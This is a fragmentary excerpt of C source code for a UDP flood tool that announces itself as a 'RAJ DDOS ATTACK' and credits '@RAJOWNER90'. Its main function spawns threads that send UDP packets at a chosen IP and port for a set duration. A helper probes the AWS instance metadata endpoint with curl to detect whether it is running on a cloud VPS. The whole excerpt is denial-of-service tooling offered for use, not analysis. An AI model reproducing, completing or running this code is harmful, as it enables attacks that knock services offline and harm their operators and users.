...
int is_vps() {
    ...
    if(system("command -v curl >/dev/null 2>&1") == 0){.
        if(system("curl -s -f -m 5 http://169.254.169.254/latest/meta-data/instance-id > /dev/null 2>&1") == 0){
            return 1; //Detect AWS EC2 instance
        }
...
int main(int argc, char *argv[]) {
    ...
    printf("STARTING RAJ DDOS ATTACK ON  %s:%d for %d seconds with %d threads\n", ip, port, duration, num_threads);

    for (int i = 0; i < num_threads; i++) {
        args[i].ip = ip;
        args[i].port = port;
        args[i].duration = duration; 
        if (pthread_create(&threads[i], NULL, send_udp_packets, (void *)&args[i]) != 0) {
    ...
    printf("CREDIT - @RAJOWNER90 ATTACK COMPLETED\n");
